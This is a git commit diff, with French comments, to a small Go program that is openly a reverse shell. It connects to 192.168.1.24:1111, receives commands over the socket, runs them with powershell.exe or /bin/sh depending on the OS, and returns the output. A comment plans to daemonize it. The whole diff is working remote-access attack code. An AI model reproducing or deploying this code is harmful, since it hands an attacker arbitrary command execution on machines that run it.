1364350bd274fcdc3c6e9905ba7bb895c5d25925
Nokeni <61007904+Lucaskrell@users.noreply.github.com>
2022-06-02 20:28:50 +0200

    handle linux/windows + refactor

--- main.go
+++ main.go
@@ -5,21 +5,30 @@ import (
 	"log"
 	"net"
 	"os/exec"
+	"runtime"
+	"strconv"
 )
 
 // To-Do :
-// - capturer stdout et renvoyer ca en live au client (capturer en 1 fois le pwd courrant + output commande en direct)
 // - daemonizer via https://github.com/sevlyar/go-daemon
-// - refactor pck là c immonde
 
 func main() {
-	conn, err := net.Dial("tcp", "192.168.1.24:1111")
+	reverseShell("192.168.1.24", 1111)
+}
+
+func reverseShell(host string, port int) {
+	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 	handleError(err)
+	var shell string
+	if runtime.GOOS == "windows" {
+		shell = "powershell.exe"
+	} else {
+		shell = "/bin/sh"
+	}
 	for {
-		// On attend que le client envoie via le pipe une string qui contient \n pour pas boucler a fond + juste récup l'entrée client
 		txtFromClient, err := bufio.NewReader(conn).ReadString('\n')
 		handleError(err)
-		cmdOutput, err := exec.Command("powershell.exe", txtFromClient).Output()
+		cmdOutput, err := exec.Command(shell, txtFromClient).Output()
 		if err != nil {
 			conn.Write([]byte("Commande inconnue\n"))
 		}
